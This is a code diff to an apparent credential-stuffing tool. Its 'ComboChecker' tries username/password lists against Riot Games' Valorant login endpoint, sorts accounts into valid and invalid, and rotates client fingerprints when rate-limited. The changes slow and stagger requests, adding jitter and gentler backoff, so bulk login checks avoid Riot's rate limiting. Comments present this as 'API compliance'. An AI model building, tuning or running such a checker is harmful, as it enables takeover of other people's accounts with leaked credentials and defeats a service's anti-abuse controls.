@@ -75,9 +75,9 @@ VALORANT_AUTH_URL = "https://auth.riotgames.com/api/v1/authorization"
 RIOT_CLIENT_VERSION = "release-07.12-shipping-9-911796"
 RIOT_CLIENT_PLATFORM = "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
 
-# Multi-threading settings
-DEFAULT_MAX_WORKERS = 5
-MAX_WORKERS_LIMIT = 20
+# Multi-threading settings - More conservative for Riot API
+DEFAULT_MAX_WORKERS = 2
+MAX_WORKERS_LIMIT = 3
 
 # Global storage for active sessions
 active_sessions = {}
@@ -753,17 +753,17 @@ class ComboChecker:
         """Check a single combo with enhanced rate limiting and thread safety"""
         start_request_time = time.time()
         
-        # Stagger initial requests more aggressively to prevent burst
-        initial_stagger = (index % self.max_workers) * 2.0  # 2 seconds between thread starts
+        # Much more aggressive initial staggering to prevent burst requests
+        initial_stagger = (index % self.max_workers) * 5.0  # 5 seconds between thread starts
         if index > 0:
             time.sleep(initial_stagger)
         
-        # Global rate limiting with exponential backoff
+        # Global rate limiting with much more conservative approach
         with self.progress_lock:
             current_time = time.time()
             if hasattr(self, 'last_global_request') and self.last_global_request:
                 time_since_last = current_time - self.last_global_request
-                min_delay = getattr(self, 'global_rate_limit', 3.0)  # Start with 3 second minimum
+                min_delay = getattr(self, 'global_rate_limit', 8.0)  # Start with 8 second minimum
                 
                 if time_since_last < min_delay:
                     sleep_time = min_delay - time_since_last
@@ -773,14 +773,15 @@ class ComboChecker:
         
         result = self.check_single_combo(username, password)
         
-        # Enhanced rate limit handling
+        # Enhanced rate limit handling with more conservative approach
         if result.get('status') == 'rate_limited':
             with self.progress_lock:
-                # Exponential backoff for rate limiting
+                # Much more conservative rate limiting
                 if not hasattr(self, 'global_rate_limit'):
-                    self.global_rate_limit = 3.0
+                    self.global_rate_limit = 8.0
                 
-                self.global_rate_limit = min(self.global_rate_limit * 2.0, 30.0)  # Max 30 seconds
+                # Increase delay more gradually and cap at reasonable limit
+                self.global_rate_limit = min(self.global_rate_limit * 1.5, 60.0)  # Max 60 seconds, slower growth
                 
                 # Log rate limit detection
                 logging.warning(f"Rate limit detected! Increasing delay to {self.global_rate_limit}s")
@@ -799,10 +800,10 @@ class ComboChecker:
                         logging.warning(f"Fingerprint rotation failed: {e}")
                         
         elif result.get('status') in ['valid', 'invalid']:
-            # Gradually reduce rate limit delay on successful requests
+            # Very gradually reduce rate limit delay on successful requests
             with self.progress_lock:
-                if hasattr(self, 'global_rate_limit') and self.global_rate_limit > 2.0:
-                    self.global_rate_limit = max(self.global_rate_limit * 0.95, 2.0)  # Min 2 seconds
+                if hasattr(self, 'global_rate_limit') and self.global_rate_limit > 5.0:
+                    self.global_rate_limit = max(self.global_rate_limit * 0.98, 5.0)  # Min 5 seconds, very slow recovery
         
         # Track response times and update statistics
         response_time = time.time() - start_request_time
@@ -846,9 +847,9 @@ class ComboChecker:
             else:
                 self.progress['success_rate'] = 0.0
         
-        # Apply additional delay with some randomization
-        additional_delay = self.delay + random.uniform(-0.5, 0.5)  # ±0.5s jitter
-        time.sleep(max(0.5, additional_delay))  # Minimum 0.5s delay
+        # Apply much larger additional delay with randomization
+        additional_delay = self.delay + random.uniform(2.0, 4.0)  # +2-4s additional jitter
+        time.sleep(max(3.0, additional_delay))  # Minimum 3s delay between all requests
             
         return result
     
@@ -954,12 +955,12 @@ def start_batch():
     delay = float(data.get('delay', 3.0))  # Increased default delay
     max_workers = int(data.get('max_workers', 2))  # Reduced default workers
     
-    # Stricter validation for Riot API compliance
-    max_workers = min(max_workers, 5)  # Reduced max workers to prevent rate limiting
+    # Much stricter validation for Riot API compliance
+    max_workers = min(max_workers, 2)  # Maximum 2 workers to prevent rate limiting
     max_workers = max(max_workers, 1)
     
-    # Higher minimum delay for Riot API compliance
-    delay = max(delay, 2.0)  # Minimum 2 seconds
+    # Much higher minimum delay for Riot API compliance
+    delay = max(delay, 5.0)  # Minimum 5 seconds
     
     if 'uploaded_file' not in session:
         return jsonify({'error': 'No file uploaded'}), 400
